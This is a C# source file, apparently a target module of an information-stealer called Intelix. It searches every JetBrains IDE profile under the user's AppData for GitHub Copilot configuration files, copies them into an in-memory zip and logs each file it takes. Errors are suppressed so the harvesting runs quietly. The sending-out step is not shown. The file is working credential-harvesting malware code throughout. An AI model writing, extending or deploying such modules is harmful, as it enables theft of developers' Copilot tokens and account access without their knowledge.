using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.AI_Agent
{
    public class IntelliJCopilot : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string jetbrainsRoot = Path.Combine(appdata, "JetBrains");
            if (!Directory.Exists(jetbrainsRoot)) return;
            var entry = new Counter.CounterApplications { Name = "IntelliJ Copilot" };
            foreach (string ideDir in Directory.GetDirectories(jetbrainsRoot))
            {
                string copilotXml = Path.Combine(ideDir, "options", "github.copilot.xml");
                if (!File.Exists(copilotXml)) continue;
                try
                {
                    string ideName = Path.GetFileName(ideDir);
                    string rel = "AI-Agent\\IntelliJCopilot\\" + ideName + "\\github.copilot.xml";
                    zip.AddFile(rel, File.ReadAllBytes(copilotXml));
                    entry.Files.Add(copilotXml + " => " + rel);
                }
                catch { }
            }
            if (entry.Files.Count > 0) counter.AI.Add(entry);
        }
    }
}
